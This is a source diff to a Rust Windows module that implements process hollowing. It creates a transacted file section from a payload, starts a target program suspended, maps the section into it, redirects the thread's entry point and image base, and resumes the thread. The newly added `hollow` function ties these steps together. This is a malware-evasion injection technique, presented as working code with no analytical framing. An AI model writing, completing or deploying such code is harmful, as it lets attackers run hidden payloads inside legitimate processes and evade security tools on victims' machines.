@@ -2,11 +2,13 @@
 
 extern crate alloc;
 
+use alloc::vec;
 use alloc::vec::Vec;
 use core::ffi::c_void;
 use core::mem::zeroed;
 use core::ptr::{copy_nonoverlapping, null_mut};
 use ntapi::ntmmapi::{NtCreateSection, NtMapViewOfSection, ViewShare};
+use utils::path::Path;
 use utils::WideString;
 use winapi::um::winbase::{CREATE_NO_WINDOW, DETACHED_PROCESS};
 use windows_sys::core::{PCWSTR, PWSTR};
@@ -16,7 +18,7 @@ use windows_sys::Win32::Storage::FileSystem::{CreateFileTransactedW, CreateFileW
 use windows_sys::Win32::System::Diagnostics::Debug::{SetThreadContext, WriteProcessMemory, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64};
 use windows_sys::Win32::System::Memory::{CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, FILE_MAP_READ, PAGE_READONLY, SECTION_ALL_ACCESS, SEC_IMAGE};
 use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
-use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW};
+use windows_sys::Win32::System::Threading::{ResumeThread, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW};
 
 type PVoid = *const c_void;
 type PByte = *const u8;
@@ -27,7 +29,7 @@ macro_rules! module_function {
         $name:ident,
         fn($($arg:ident : $arg_ty:ty),*) -> $ret:ty
     ) => {
-        #[allow(non_snake_case)]
+        #[allow(non_snake_case, clippy::too_many_arguments, clippy::missing_transmute_annotations)]
         unsafe fn $name($($arg: $arg_ty),*) -> $ret {
             use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
             use core::mem::transmute;
@@ -188,8 +190,9 @@ where
     Ok(section)
 }
 
-pub fn create_new_process_internal<S>(cmd_line: S, start_dir: S) -> Option<PROCESS_INFORMATION>
+pub fn create_new_process_internal<C, S>(cmd_line: C, start_dir: S) -> Option<PROCESS_INFORMATION>
 where
+    C: AsRef<str>,
     S: AsRef<str>
 {
     let cmd_line = cmd_line.as_ref().to_wide();
@@ -226,7 +229,7 @@ where
     Some(pi)
 }
 
-pub fn map_buffer_into_process(process: HANDLE, section: HANDLE) -> Option<HANDLE> {
+pub fn map_buffer_into_process(process: HANDLE, section: HANDLE) -> Option<PVoid> {
     let view_size = 0usize;
     let section_base_address: *mut c_void = null_mut();
 
@@ -309,7 +312,7 @@ where
         GetFileSize(file, null_mut())
     } as usize;
 
-    let mut buffer = Vec::with_capacity(payload_size);
+    let mut buffer = vec![0u8; payload_size];
     unsafe { buffer.set_len(payload_size) };
 
     unsafe {
@@ -397,4 +400,29 @@ fn set_new_image_base(process: HANDLE, thread: HANDLE, loaded_base: PVoid) -> bo
 fn redirect_to_payload(loaded_pe: PByte, loaded_base: PVoid, process: HANDLE, thread: HANDLE) -> bool {
     redirect_ep(thread, loaded_pe, loaded_base)
         && set_new_image_base(process, thread, loaded_base)
+}
+
+pub fn hollow(target: &Path, payload: &[u8]) -> bool {
+    fn try_hollow(target: &Path, payload: &[u8]) -> Option<()> {
+        let tmp = Path::temp_file("tmp");
+
+        let section = make_transacted_section(tmp, payload).ok()?;
+        let pi = create_new_process_internal(target, target.parent()?)?;
+
+        let (process, thread) = (pi.hProcess, pi.hThread);
+
+        let remote_base = map_buffer_into_process(process, section)?;
+
+        if !redirect_to_payload(payload.as_ptr(), remote_base, process, thread) {
+            None
+        } else {
+            unsafe {
+                ResumeThread(thread)
+            };
+
+            Some(())
+        }
+    }
+
+    try_hollow(target, payload).is_some()
 }
